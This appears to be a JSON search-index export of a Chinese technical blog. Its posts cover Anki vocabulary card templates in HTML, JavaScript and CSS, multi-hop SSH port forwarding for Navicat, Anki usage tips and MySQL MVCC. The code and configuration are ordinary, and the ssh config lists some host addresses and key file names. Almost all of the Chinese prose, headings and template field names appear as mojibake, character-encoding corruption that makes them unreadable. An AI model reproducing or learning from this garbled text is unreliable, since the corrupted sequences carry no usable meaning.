line.indexOf(\"</p>\");\n      if (index > 0 && !pattern.test(line)) {\n          var text = line.substring(0, index);\n          output += text + \"\\n\\n\";\n      }\n  }\n  document.getElementById(\"kelin\").innerText=output; \n  \n  // è‡ªåŠ¨æ’­æ”¾\n  var elem = document.querySelector(\"#autoplay .soundLink, #autoplay .replaybutton\"); \n    if (elem) { elem.click(); }\n  \n  </script>\n  ```\n\n\n\n+ åé¢æ¨¡æ¿\n\n  ```html\n  {{FrontSide}}\n  \n  <br>\n  <div>\n  <div id=\"\" class=\"section\">ä¸­æ–‡æ„æ€</div>\n  <div id=\"\" class=\"extension\">{{ä¸­æ–‡æ„æ€}}</div>\n  </div>\n  \n  <br/>\n  <div>\n  <div id=\"\" class=\"section\">æŸ¯æ—æ–¯</div>\n  <div id=\"\" class=\"extension\">{{æŸ¯æ—æ–¯}}</div>\n  </div>\n  \n  <br>\n  <div>\n  <div id=\"\" class=\"section\">è‹±è¯­ä¾‹å¥</div>\n  <div id=\"e_sentence\" class=\"extension\">{{è‹±è¯­ä¾‹å¥}}</div>\n  </div>\n  \n  <br>\n  <div>\n  <div id=\"\" class=\"section\">è‹±è¯­ä¾‹å¥å¸¦å‘éŸ³</div>\n  <div id=\"e_sound\" class=\"extension\">{{è‹±è¯­ä¾‹å¥å¸¦å‘éŸ³}}</div>\n  </div>\n  \n  <br>\n  <div>\n  <div id=\"\" class=\"section\">è¿‘ä¹‰è¯</div>\n  <div id=\"\" class=\"extension\">{{è¿‘ä¹‰è¯}}</div>\n  </div>\n  \n  <br>\n  <div>\n  <div id=\"\" class=\"section\">ç›¸å…³è¯è¯­</div>\n  <div id=\"\" class=\"extension\">{{ç›¸å…³è¯è¯­}}</div>\n  </div>\n  \n  <br>\n  <div>\n  <div id=\"\" class=\"section\">å›¾ç‰‡é›†</div>\n  <div id=\"\" class=\"extension\">{{å›¾ç‰‡é›†}}</div>\n  </div>\n  \n  <script type=\"text/javascript\">\n  var initVoice = function () {\n      var player = document.getElementById('dictVoice');\n      document.addEventListener('click', function (e) {\n          var target = e.target;\n          if (target.hasAttribute('role') && target.getAttribute('role').indexOf('dict_audio_js') >= 0) {\n              var url = target.getAttribute('data-rel');\n              player.setAttribute('src', url);\n              player.volume = 1;\n              player.play();\n              e.preventDefault();\n          }\n      }, false);\n  };\n  initVoice();\n  \n  var str = document.getElementById(\"e_sound\").innerHTML;\n  str = str.replace(/channel_title/g, 'e_sound1')\n  document.getElementById(\"e_sound\").innerHTML=str;\n  //document.getElementById(\"e_sound\").innerText=str;\n  \n  </script>\n  \n  <style>\n  .e_sound1 {\n      font-size: 10px;\n  \tcolor: green;\n  \ttext-decoration: none;\n  </style>\n  \n  ```\n\n+ æ ·å¼\n\n  ```html\n  </style>\n  \n  <style>\n  @import url('_collins_c.css');\n  \n  .card.nightMode { background-color: #555; }\n  .nightMode .extension { color: #555; }\n  \n  \n  #kelin1{\n   font-size:20px;\n   background:#69ac1d;\n  }\n  \n  \n  #vocab{\n   font-size: 20px;\n   background:#69ac1d;\n   background-image: url('_vocab_logo1.png');\n   background-repeat: no-repeat;\n   background-size:contain;\n  }\n  \n  #collins_1{\n   font-size: 45px;\t\n   background:#69ac1d;\n   background-image: url('_collin_logo.png');\n   background-repeat: no-repeat;\n   background-size:contain;\n  }\n  \n  \n  .card {\n   font-family: sans-serif;\n   font-size: 16px;\n   text-align: left;\n   color:#686868;\n  }\n  \n  .section {\n   color: #444;\n   border-bottom: 3px solid #666;\n   background-color: #fff;\n   margin-top:5px;\n   padding: 10px;\n   position: relative;\n   text-align: left;\n  }\n  \n  .extension {\n   font-size: 16px;\n   line-height: 1.4em;\n   border-bottom: 1px solid #ddd;\n   background-color: #f5f5f5;\n   padding: 10px;\n   display:block;\n  }\n  \n  \n  \n  .word_header_star{\n   font-size: 20px;\n   font-family: 'SS Standard';\n   color: #fdac00;\n   position: absolute;\n   left: 15px;\n   top: 5px;\n  }\n  \n  #english{\n   font-size: 45px;\n   line-height: 80%;\n   padding-bottom:2px;\n  }\n  \n  \n  #chinese a {\n  \ttext-decoration: none;\n  \tpadding: 1px 6px 2px 5px;\n  \tmargin: 0 5px 0 0;\n  \tfont-size: 12px;\n  \tcolor: white;\n  \tfont-weight: normal;\n  \tborder-radius: 4px\n  }\n  \n  #chinese a.pos_n {\n  \tbackground-color: #e3412f\n  }\n  \n  #chinese a.pos_v {\n  \tbackground-color: #539007\n  }\n  \n  #chinese a.pos_a {\n  \tbackground-color: #f8b002\n  }\n  \n  #chinese a.pos_r {\n  \tbackground-color: #684b9d\n  }\n  \n  \n  \n  /* ç¼ºçœæ‰“å¼€ï¼ŒæŠŠblockæ”¹æˆnoneï¼Œç¼ºçœå…³é—­*/\n  #ext_vocab{\n   display:block;\n  }\n  \n  /* ç¼ºçœæ‰“å¼€ï¼ŒæŠŠblockæ”¹æˆnoneï¼Œç¼ºçœå…³é—­*/\n  #ext_collins{\n   display:block;\n  }\n  \n  .phonetic{\n   font-size:18px;\n  }\n  \n  .voice img{\n   margin-left:5px;\n   width: 24px;\n   height: 24px;\n  }\n  \n  </style>\n  \n  <script src='_jquery.js'></script>\n  <script>\n  $(document).ready(function(){\n    $.each([\"vocab\",\"collins\"],function(i,x){\n      $(\"#\"+x).click(function(){\n        $(\"#ext_\"+x).slideToggle();\n      });\n      $(\"#ext_\"+x).click(function(){\n        $(\"#ext_\"+x).slideToggle();\n      });\n    });\n  });\n  </script>\n  \n  <style>\n  ```\n\n### 3.4 æ•ˆæœå›¾\n\n<img src=\"anki%E4%B9%8B%E8%8B%B1%E8%AF%AD%E5%8D%95%E8%AF%8D%E7%AF%87/image-20220117182009001.png\" alt=\"image-20220117182009001\" style=\"zoom:32%;\" />\n\n<img src=\"anki%E4%B9%8B%E8%8B%B1%E8%AF%AD%E5%8D%95%E8%AF%8D%E7%AF%87/image-20220117182042685.png\" alt=\"image-20220117182042685\" style=\"zoom:33%;\" />\n\n\n\n# 4. å“²å­¦\n\n### 4.1 è‹±æ–‡ä¸­çš„æœ€å°å•ä½å…¶å®æ˜¯å¥å­\n\nä¸€ä¸ªå•ç‹¬çš„å•è¯ï¼Œæœ‰æ„ä¹‰å—ï¼Ÿæ²¡æœ‰ï¼\t**åªæœ‰ä¸€ä¸ªè¢«å¥å­å®Œå…¨é™å®šä½çš„è¯ï¼Œæ‰ç§°å¾—ä¸Šæœ‰æ„ä¹‰ã€‚**\n\nå­¦è€…æœ€è¦çš„[è­¦è¯­]ï¼Œæ˜¯å°‘ç”¨å †ç Œå·¥å¤«ï¼Œå­¦æ—¶å¿…æ•´å¥åä¸‹å»ï¼Œå†æ•´å¥åå‡ºæ¥ï¼Œå…¶æ–‡å¿…é¡ºï¼Œå…¶éŸ³å¿…æ­£ï¼Œå¥æ³•å¿…é€šï¼Œç”¨å­—å¿…å½“ã€‚è‹¥å‡­å­—å­—è¯‘\t\tæˆè‹±è¯­ï¼Œå†ä¾æ–‡æ³•è§„åˆ™æ…¢æ…¢å æˆå¥è¯»ï¼Œå¿…ä¸€æ— æ˜¯å¤„ï¼ŒåŠ³è€Œæ— è¡¥ã€‚\n\n### 4.2 è‹±è¯­ç¿»è¯‘è‹±è¯­\n\nçœ‹è‹±è¯­ç¿»è¯‘ï¼Œä¸€å®šä¸è¦ç”¨æ±‰è¯­å¯¹åº”å…¶æ„æ€ã€‚è¦ç”¨ç”¨è‹±è¯­å»ç¿»è¯‘è‹±è¯­ã€‚ç”¨è‹±è¯­å¥å­å»è§£é‡Šæ•´ä¸ªå•è¯ã€‚\n\n### 4.3 å·¨é‡é˜…è¯»\n\nè¿›è¡Œå·¨é‡(æ³¨æ„ï¼Œæ˜¯å·¨é‡ä¸æ˜¯å¤§é‡)çš„é˜…è¯»ï¼Œæ¥æ”¶é›†ä¸åŒçš„åŸå¥ä¸­çš„ä¸åŒå•è¯ï¼Œåªè¦ä¸è®¤è¯†å°±å¯ä»¥æ”¶é›†ã€‚\n\n### 4.4 äºŒå…«åŸåˆ™\n\næŠ•å…¥ä¸äº§å‡ºã€åŠªåŠ›ä¸æ”¶è·ã€åŸå› ä¸ç»“æœä¹‹é—´å­˜åœ¨ç€ä¸€ç§ä¸å¹³è¡¡çš„å…³ç³»ã€‚å¾€å¾€æ˜¯**å…³é”®çš„å°‘æ•°**å†³å®šç€äº‹ä»¶å‘å±•æ€åŠ¿ï¼Œè¯¥åŸåˆ™è®¤ä¸ºï¼Œ80%çš„æˆæœæ¥è‡ª20%çš„åŠªåŠ›ã€‚\n\næ™®é€šçš„ä¸€æœ¬æ•™è¾…èµ„æ–™é‡Œé¢å¤§å¤šå……æ–¥ç€åºŸè¯å¥—è¯ï¼Œéœ€è¦æˆ‘ä»¬äººä¸ºæ€»ç»“ï¼Œç­›é€‰å‡ºé‚£20%çš„é«˜æ”¶ç›Šä¿¡æ¯ã€‚\n\n### 4.5 æœ€ä½ä¿¡æ¯åŸåˆ™\n\nä¸€å¼ å¡å°½é‡åªæ”¾ä¸€ä¸ªç‚¹ï¼Œ**å¤šäºä¸€ä¸ªçŸ¥è¯†ç‚¹çš„å¡ç‰‡ä¼šä¸¥é‡å¹²æ‰°ä½ çš„å­¦ä¹ ã€‚** \n\n**æœ‰äººå¯èƒ½äº‰è¾©è¯´**æœ€ä½ä¿¡æ¯åŸåˆ™å¯¼è‡´å¡ç‰‡æ•°é‡å¢å¤šï¼Œè®°å¿†çš„è´Ÿæ‹…å¢åŠ ï¼Œç„¶è€Œç°å®å’Œä½ çš„é¢„æƒ³å®Œå…¨ç›¸åï¼Œæ­£æ˜¯ç”±äºç®€åŒ–äº†å¡ç‰‡çš„å¤æ‚åº¦ï¼Œé™ä½äº†å¡ç‰‡çš„ç†è§£éš¾åº¦ï¼Œæˆ‘ä»¬åœ¨å¤ä¹ å¡ç‰‡æ—¶åªéœ€èŠ±æçŸ­çš„æ—¶é—´ã€‚\n\nè€Œä¸”éšç€æ—¶é—´çš„æ¨ç§»ï¼Œç†Ÿæ‚‰ç¨‹åº¦çš„å¢åŠ ï¼Œå¤§é‡å¡ç‰‡ä¼šé€æ¸é€€å‡ºè®°å¿†åºåˆ—ï¼Œå› æ­¤åŠ å¿«äº†è®°å¿†æ•ˆç‡ã€‚\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://www.laohuang.net/20170226/anki-coca-20000-source-text/\n+ https://ankiweb.net/shared/addons/\n+ [https://sakronos.github.io/Note/2020/07/28/Anki%E5%A4%9C%E9%97%B4%E6%A8%A1%E5%BC%8F/](https://sakronos.github.io/Note/2020/07/28/Ankiå¤œé—´æ¨¡å¼/)\n+ https://www.reddit.com/r/Anki/comments/ioacfp/is_it_possible_to_choose_which_audio_files/\n+ https://zhuanlan.zhihu.com/p/142661482","tags":["english"],"categories":["ä½¿ç”¨è½¯ä»¶"]},{"title":"navicatä½¿ç”¨sshç«¯å£å¤šçº§è½¬å‘","url":"%2Fp%2Ffc72ccfb.html","content":"\nå¦‚æœæˆ‘ä»¬è¦ navicat è¿æ¥çº¿ä¸Šçš„æ•°æ®åº“ï¼Œä¸€èˆ¬ä¸å…è®¸åœ¨æœ¬åœ°ç›´æ¥è¿çº¿ä¸Šçš„æ•°æ®åº“åœ°å€ã€‚ä¸€èˆ¬é…ç½® navicat çš„ ssh éš§é“å®ç°å…ˆç™»ä¸Šè·³æ¿æœºï¼Œå†é“¾æ¥æ•°æ®åº“ã€‚\n\n<img src=\"navicatä½¿ç”¨sshç«¯å£å¤šçº§è½¬å‘/image-20230413181115088.png\" style=\"zoom: 50%;\" />\n\nå¯ä»¥ navicat çš„ ssh éš§é“åªæ”¯æŒä¸€çº§ï¼Œå¦‚æœæ˜¯ä¸¤å±‚æ€ä¹ˆåŠå‘¢ï¼Ÿè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ssh ç«¯å£è½¬å‘ã€‚\n\n<!-- more -->\n\n# 1. ssh ç«¯å£è½¬å‘\n\n### 1.1 ssh config\n\nä¾‹å¦‚æˆ‘è¦å»testæœåŠ¡å™¨ï¼Œå»è¿æ¥æ•°æ®åº“ï¼Œæ¶‰åŠåˆ°äºŒçº§è·³è½¬ã€‚\n\n```bash\nHost test\n        HostName 172.31.58.22\n        Port 22\n        User web\n        IdentityFile ~/.ssh/web.pem\n        ProxyCommand ssh -q -x -W %h:%p jump\n\nHost jump\n        HostName 13.52.21.111\n        Port 22\n        IdentityFile ~/.ssh/fhyx\n        User ubuntu\n```\n\n\n\n### 1.2 æœ¬åœ°å¼€å¯è½¬å‘\n\n```bash\n# mysql ä»£ç†\nnohup ssh -fvNL localhost:3308:myk0c8.us-west-1.rds.com:3306 ubuntu@test &\n\n\n# mongo ä»£ç†\nnohup ssh -fvNL localhost:27018:localhost:27017 ubuntu@test &\n\n```\n\n\n\n### 1.3 navicaté…ç½®\n\nåªéœ€è¦è¿æ¥æœ¬åœ°çš„3308ç«¯å£å°±è¡Œï¼Œè‡ªåŠ¨è½¬å‘åˆ° test æœåŠ¡å™¨çš„ `myk0c8.us-west-1.rds.amazonaws.com:3306`\n\n<img src=\"navicatä½¿ç”¨sshç«¯å£å¤šçº§è½¬å‘/image-20230413184944395.png\" alt=\"image-20230413184944395\" style=\"zoom:50%;\" />\n\n\n\n# 2. å‚è€ƒèµ„æ–™\n\n- https://my.oschina.net/yingkui/blog/745093\n- https://www.xiebruce.top/1185.html\n- https://zhuanlan.zhihu.com/p/148825449\n","tags":["ssh"],"categories":["è½¯ä»¶"]},{"title":"ankiè®°å¿†ç¥å™¨çš„ä½¿ç”¨","url":"%2Fp%2F9200c91e.html","content":"\nAnkiï¼Œä¸€ä¸ªå­¦ä¹ è¾…åŠ©è®°å¿†å·¥å…·ä¸­å°ç¥çš„å­˜åœ¨ã€‚\n\n# 1. ä½¿ç”¨\n\n### 1.1 å®‰è£…\n\nmacå…è´¹ï¼Œios168, æ·˜å®å¯ä»¥1å…ƒè´­ä¹°\n\n<!-- more -->\n\n### 1.2 anki connect æ’ä»¶\n\nhttps://github.com/FooSoft/anki-connect\n\næ³¨æ„æ’ä»¶åªåœ¨clientç«¯æœ‰ç”¨ï¼Œç§»åŠ¨ç«¯æ— ç”¨ã€‚è¿æ¥è´¦å·æ¨èä½¿ç”¨anki connectï¼Œ ä½¿ç”¨anki webè¿æ¥æœ‰å¯èƒ½ä¼šå¯¼è‡´å°å·ã€‚\n\n\n\n# 2. è‹±è¯­å­¦ä¹ \n\n### 2.1 å•è¯å‘ç°è€…\n\næˆ‘åªæ˜¾ç¤ºäº†æ ‡çº¢ï¼Œè®¾ç½®ä¸popupã€‚\n\n<img src=\"anki%E8%AE%B0%E5%BF%86%E7%A5%9E%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220108160853572.png\" alt=\"image-20220108160853572\" style=\"zoom:45%;\" />\n\n<img src=\"anki%E8%AE%B0%E5%BF%86%E7%A5%9E%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220108160936759.png\" alt=\"image-20220108160936759\" style=\"zoom: 33%;\" />\n\n\n\n### 2.2 åœ¨çº¿è¯å…¸åŠ©æ‰‹  \n\n https://github.com/ninja33/ODH\n\nåˆ¶ä½œå¡ç‰‡çš„æ—¶å€™ï¼Œéœ€è¦ä¿æŒmacä¸‹ankiçš„å¯åŠ¨ï¼Œæ‰èƒ½ä½¿ç”¨ankiconnectã€‚\n\n<img src=\"anki%E8%AE%B0%E5%BF%86%E7%A5%9E%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220108160520630.png\" alt=\"image-20220108160520630\" style=\"zoom:50%;\" />\n\n<img src=\"anki%E8%AE%B0%E5%BF%86%E7%A5%9E%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220108160529813.png\" alt=\"image-20220108160529813\" style=\"zoom:50%;\" />\n\n\n\n# 3. å“²å­¦\n\n### 3.1 åŸåˆ™\n\n+ è¦æ‹†è§£å†…å®¹ã€‚\n+ è¦ç”¨è‡ªå·±çš„è¯æè¿°ã€‚\n+ è¦æŠŠé—®é¢˜åŸå­åŒ–ã€‚\n+ ä¸€å¼ å¡å°½é‡åªæ”¾ä¸€ä¸ªç‚¹ï¼Œ**å¤šäºä¸€ä¸ªçŸ¥è¯†ç‚¹çš„å¡ç‰‡ä¼šä¸¥é‡å¹²æ‰°ä½ çš„å­¦ä¹ ã€‚** \n\n### 3.2 æ‹†åˆ†å\n\næ€»é‡æ˜¯ä¸€æ ·çš„ï¼Œæ‹†åˆ†æˆå‡ ä¸ªå°å—é€ä¸ªå‡»ç ´ï¼Œä»»åŠ¡æ›´è½»æ¾ï¼›æ¯ä¸ªçŸ¥è¯†ç‚¹çš„è®°å¿†æƒ…å†µå¯ä»¥äº¤ç”±Ankiè¿½è¸ªï¼Œä»è€Œå®ç°æœ‰é‡ç‚¹çš„å¤ä¹ ã€‚\n\næŒ‰çŸ¥è¯†ç‚¹åˆ’åˆ†å¼€æ¥ï¼Œæœ‰å¾ˆå¤šç›Šå¤„ï¼Œä½†å”¯ä¸€çš„åå¤„æ˜¯ï¼Œè¿™äº›çŸ¥è¯†æœ¬æ¥å…³äºæŸä¸ªä¸»é¢˜ï¼Œæ”¾åœ¨ä¸€èµ·æœ‰è”ç³»ï¼›ç°åœ¨æ‹†å¼€äº†ï¼Œéšç€ä¸€å¤©å¤©çš„å¤ä¹ ï¼Œä¸ä¼šæ‹†æ•£å—ï¼Ÿ\n\nç»æµçš„æ–¹æ³•æ˜¯ä½¿ç”¨æ ‡ç­¾ï¼Œè¿‡æ»¤ç‰Œç»„å¯ä»¥å•ç‹¬å­¦ä¹ ä¸€ä¸ªæ ‡ç­¾ä¸‹çš„å¡ç‰‡ï¼ŒåŒæ—¶ä¸ä¼šç ´ååŸæœ‰çš„è¿›ç¨‹ã€‚\n\n### 3.3 æŠ˜è…¾\n\nä½¿ç”¨Ankiçš„é—¨æ§›ç¡®å®æ¯”è¾ƒé«˜ã€‚åœ¨æ»¡è¶³é«˜æ•ˆçš„æƒ…å†µä¸‹ï¼Œæœ‰äººåœ¨è¿½æ±‚å‘éŸ³å®Œç¾ï¼Œæœ‰äººåœ¨è¿½æ±‚é…è‰²æ¼‚äº®ï¼Œæœ‰äººè¿½æ±‚æ‰¹é‡åˆ¶ä½œï¼Œæœ‰äººåœ¨è¿½æ±‚é«˜é€ŸåŒæ­¥ï¼Œæœ‰äººåœ¨å›¤ç§¯å¡ç‰‡ï¼Œè¿™äº›è¡Œä¸ºå¯¹å­¦ä¹ çš„å¸®åŠ©æœ‰è¿™ä¹ˆå¤§å—ï¼Ÿ\n\nåœ¨æ¥è§¦Ankiçš„è¿‡ç¨‹ä¸­æ¸æ¸åç¦»äº†å½“åˆçš„ç›®æ ‡ï¼Œå¼€å§‹ç ”ç©¶èµ·äº†å·¥å…·ï¼Œ**èŠ±è´¹å¤§é‡ç²¾åŠ›åˆ°å­¦ä¹ å¦‚ä½•ç”¨å·¥å…·ä¸Š**ï¼Œå´å¿˜äº†å½“åˆæƒ³å€Ÿå·¥å…·é«˜æ•ˆå­¦ä¹ çš„ç›®çš„ã€‚\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://zhuanlan.zhihu.com/p/21328602\n+ https://www.yuque.com/purequant/anki\n+ https://www.laohuang.net/20180213/online-dictionary-helper/\n+ https://www.laohuang.net/20170311/ios-workflow-dict-helper/\n+ https://zhuanlan.zhihu.com/p/112795346\n","tags":["anki"],"categories":["ä½¿ç”¨è½¯ä»¶"]},{"title":"mysqlçš„mvccå®ç°åŸç†","url":"%2Fp%2Fa0f7945d.html","content":"\n# 1. åŸºç¡€\n\n### 1.1 MVCCæ¦‚å¿µ\n\nMVCCï¼Œå…¨ç§°Multi-Version Concurrency Controlï¼Œå³å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ã€‚MVCCæ˜¯ä¸€ç§å¹¶å‘æ§åˆ¶çš„æ–¹æ³•ï¼Œä¸€èˆ¬åœ¨æ•°æ®åº“ç®¡ç†ç³»ç»Ÿä¸­ï¼Œå®ç°å¯¹æ•°æ®åº“çš„å¹¶å‘è®¿é—®ï¼Œåœ¨ç¼–ç¨‹è¯­è¨€ä¸­å®ç°äº‹åŠ¡å†…å­˜ã€‚\n\nMVCCåœ¨MySQL InnoDBä¸­çš„å®ç°ä¸»è¦æ˜¯ä¸ºäº†æé«˜æ•°æ®åº“å¹¶å‘æ€§èƒ½ï¼Œç”¨æ›´å¥½çš„æ–¹å¼å»å¤„ç†è¯»-å†™å†²çªï¼Œåšåˆ°å³ä½¿æœ‰è¯»å†™å†²çªæ—¶ï¼Œä¹Ÿèƒ½åšåˆ°ä¸åŠ é”ï¼Œéé˜»å¡å¹¶å‘è¯»ã€‚\n\nInnoDBé€šè¿‡undo logä¿å­˜æ¯æ¡æ•°æ®çš„å¤šä¸ªç‰ˆæœ¬ï¼Œå¹¶ä¸”èƒ½å¤Ÿæ‰¾å›æ•°æ®å†å²ç‰ˆæœ¬æä¾›ç»™ç”¨æˆ·è¯»ï¼Œæ¯ä¸ªäº‹åŠ¡è¯»åˆ°çš„æ•°æ®ç‰ˆæœ¬å¯èƒ½æ˜¯ä¸ä¸€æ ·çš„ã€‚åœ¨åŒä¸€ä¸ªäº‹åŠ¡ä¸­ï¼Œç”¨æˆ·åªèƒ½çœ‹åˆ°è¯¥äº‹åŠ¡åˆ›å»ºå¿«ç…§ä¹‹å‰å·²ç»æäº¤çš„ä¿®æ”¹å’Œè¯¥äº‹åŠ¡æœ¬èº«åšçš„ä¿®æ”¹ã€‚\n\n**MVCCåªåœ¨ Read Committed å’Œ Repeatable Readä¸¤ä¸ªéš”ç¦»çº§åˆ«ä¸‹å·¥ä½œã€‚**\n\n<!-- more -->\n\n### 1.2 MVCCè§£å†³é—®é¢˜\n\næ•°æ®åº“å¹¶å‘åœºæ™¯?æœ‰ä¸‰ç§, åˆ†åˆ«ä¸ºï¼š\n\n+ è¯»-è¯»ï¼šä¸å­˜åœ¨ä»»ä½•é—®é¢˜ï¼Œä¹Ÿä¸éœ€è¦å¹¶å‘æ§åˆ¶\n\n+ è¯»-å†™ï¼šæœ‰çº¿ç¨‹å®‰å…¨é—®é¢˜ï¼Œå¯èƒ½ä¼šé€ æˆäº‹åŠ¡éš”ç¦»æ€§é—®é¢˜ï¼Œå¯èƒ½é‡åˆ°è„è¯»ï¼Œå¹»è¯»ï¼Œä¸å¯é‡å¤è¯»\n\n+ å†™-å†™ï¼šæœ‰çº¿ç¨‹å®‰å…¨é—®é¢˜ï¼Œå¯èƒ½ä¼šå­˜åœ¨æ›´æ–°ä¸¢å¤±é—®é¢˜ï¼Œæ¯”å¦‚ç¬¬ä¸€ç±»æ›´æ–°ä¸¢å¤±ï¼Œç¬¬äºŒç±»æ›´æ–°ä¸¢å¤±\n\n  \n\n**å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼ˆMVCCï¼‰æ˜¯ä¸€ç§ç”¨æ¥è§£å†³è¯»-å†™å†²çªçš„æ— é”å¹¶å‘æ§åˆ¶**ï¼Œä¹Ÿå°±æ˜¯ä¸ºäº‹åŠ¡åˆ†é…å•å‘å¢é•¿çš„æ—¶é—´æˆ³ï¼Œä¸ºæ¯ä¸ªä¿®æ”¹ä¿å­˜ä¸€ä¸ªç‰ˆæœ¬ï¼Œç‰ˆæœ¬ä¸äº‹åŠ¡æ—¶é—´æˆ³å…³è”ï¼Œè¯»æ“ä½œåªè¯»è¯¥äº‹åŠ¡å¼€å§‹å‰çš„æ•°æ®åº“çš„å¿«ç…§ã€‚ æ‰€ä»¥MVCCå¯ä»¥ä¸ºæ•°æ®åº“è§£å†³ä»¥ä¸‹é—®é¢˜\n\nåœ¨å¹¶å‘è¯»å†™æ•°æ®åº“æ—¶ï¼Œå¯ä»¥åšåˆ°åœ¨è¯»æ“ä½œæ—¶ä¸ç”¨é˜»å¡å†™æ“ä½œï¼Œå†™æ“ä½œä¹Ÿä¸ç”¨é˜»å¡è¯»æ“ä½œï¼Œæé«˜äº†æ•°æ®åº“å¹¶å‘è¯»å†™çš„æ€§èƒ½ åŒæ—¶è¿˜å¯ä»¥è§£å†³è„è¯»ï¼Œå¹»è¯»ï¼Œä¸å¯é‡å¤è¯»ç­‰äº‹åŠ¡éš”ç¦»é—®é¢˜ï¼Œä½†ä¸èƒ½è§£å†³æ›´æ–°ä¸¢å¤±é—®é¢˜ã€‚\n\n## 2. å½“å‰åº¦å’Œå¿«ç…§è¯»\n\n### 2.1 å½“å‰è¯»(å¢ï¼Œæ”¹ï¼Œåˆ ï¼ŒåŠ é”)\n\nåƒselect lock in share mode(å…±äº«é”), select for update ; update, insert ,delete(æ’ä»–é”)è¿™äº›æ“ä½œéƒ½æ˜¯ä¸€ç§å½“å‰è¯»ã€‚\n\nä¸ºä»€ä¹ˆå«å½“å‰è¯»ï¼Ÿå°±æ˜¯å®ƒè¯»å–çš„æ˜¯è®°å½•çš„æœ€æ–°ç‰ˆæœ¬ï¼Œè¯»å–æ—¶è¿˜è¦ä¿è¯å…¶ä»–å¹¶å‘äº‹åŠ¡ä¸èƒ½ä¿®æ”¹å½“å‰è®°å½•ï¼Œä¼šå¯¹è¯»å–çš„è®°å½•è¿›è¡ŒåŠ é”ã€‚\n\n+ æ³¨æ„ï¼Œå…±äº«é”ä¹Ÿæ˜¯æ‚²è§‚é”ã€‚ä¹è§‚é”å’Œæ‚²è§‚é”æ˜¯ä¸€ç§ç¼–ç¨‹ç­–ç•¥ï¼Œå¹¶ä¸æ˜¯æ•°æ®åº“å…·æœ‰æ‚²è§‚é”å’Œä¹è§‚é”ã€‚\n\n### 2.2 å¿«ç…§è¯»(æ™®é€šselect)\n\nåƒä¸åŠ é”çš„selectæ“ä½œå°±æ˜¯å¿«ç…§è¯»ï¼Œå³ä¸åŠ é”çš„éé˜»å¡è¯»ï¼›å¿«ç…§è¯»çš„å‰ææ˜¯éš”ç¦»çº§åˆ«ä¸æ˜¯ä¸²è¡Œçº§åˆ«ï¼Œä¸²è¡Œçº§åˆ«ä¸‹çš„å¿«ç…§è¯»ä¼šé€€åŒ–æˆå½“å‰è¯»ï¼›\n\nä¹‹æ‰€ä»¥å‡ºç°å¿«ç…§è¯»çš„æƒ…å†µï¼Œæ˜¯åŸºäºæé«˜å¹¶å‘æ€§èƒ½çš„è€ƒè™‘ï¼Œå¿«ç…§è¯»çš„å®ç°æ˜¯åŸºäºå¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼Œå³MVCCã€‚å¯ä»¥è®¤ä¸ºMVCCæ˜¯è¡Œé”çš„ä¸€ä¸ªå˜ç§ï¼Œä½†å®ƒåœ¨å¾ˆå¤šæƒ…å†µä¸‹ï¼Œé¿å…äº†åŠ é”æ“ä½œï¼Œé™ä½äº†å¼€é”€ï¼›æ—¢ç„¶æ˜¯åŸºäºå¤šç‰ˆæœ¬ï¼ˆmysqlè¯»å–undo logå†å²ç‰ˆæœ¬) ï¼Œå³å¿«ç…§è¯»å¯èƒ½è¯»åˆ°çš„å¹¶ä¸ä¸€å®šæ˜¯æ•°æ®çš„æœ€æ–°ç‰ˆæœ¬ï¼Œè€Œæœ‰å¯èƒ½æ˜¯ä¹‹å‰çš„å†å²ç‰ˆæœ¬ã€‚\n\n### 2.3 RC å’Œ RR å¿«ç…§è¯»æœ‰ä»€ä¹ˆä¸åŒ\n\næ­£æ˜¯Read Viewç”Ÿæˆæ—¶æœºçš„ä¸åŒï¼Œä»è€Œé€ æˆRC,RRçº§åˆ«ä¸‹å¿«ç…§è¯»çš„ç»“æœçš„ä¸åŒã€‚\n\n1. Read Committedçº§åˆ«, äº‹åŠ¡åœ¨beginä¹‹åï¼Œæ‰§è¡Œæ¯æ¡selectï¼ˆè¯»æ“ä½œï¼‰è¯­å¥æ—¶ï¼Œå¿«ç…§ä¼šè¢«é‡ç½®ï¼Œå³ä¼šé‡æ–°åˆ›å»ºä¸€ä¸ªå¿«ç…§(read view)ã€‚\n\n2. Repeatable Readçº§åˆ«, åªæœ‰äº‹åŠ¡åœ¨beginä¹‹åï¼Œæ‰§è¡Œç¬¬ä¸€æ¡selectï¼ˆè¯»æ“ä½œï¼‰æ—¶, æ‰ä¼šåˆ›å»ºä¸€ä¸ªå¿«ç…§(read view)ï¼Œå°†å½“å‰ç³»ç»Ÿä¸­æ´»è·ƒçš„å…¶ä»–äº‹åŠ¡è®°å½•èµ·æ¥ï¼›å¹¶ä¸”äº‹åŠ¡ä¹‹åéƒ½æ˜¯ä½¿ç”¨çš„è¿™ä¸ªå¿«ç…§ï¼Œä¸ä¼šé‡æ–°åˆ›å»ºï¼Œç›´åˆ°äº‹åŠ¡ç»“æŸã€‚\n\n### 2.4 å½“å‰è¯»å’Œå¿«ç…§è¯»åœ¨RRçº§åˆ«ä¸‹çš„åŒºåˆ«\n\n+ æŸ¥è¯¢æ—¶æœº1\n\n<img src=\"mysqlçš„mvccå®ç°åŸç†/image-20230830140616956.png\" alt=\"image-20230830140616956\" style=\"zoom:30%;\" />\n\n+ æŸ¥è¯¢æ—¶æœº2\n\n<img src=\"mysqlçš„mvccå®ç°åŸç†/image-20230830140625481.png\" alt=\"image-20230830140625481\" style=\"zoom:30%;\" 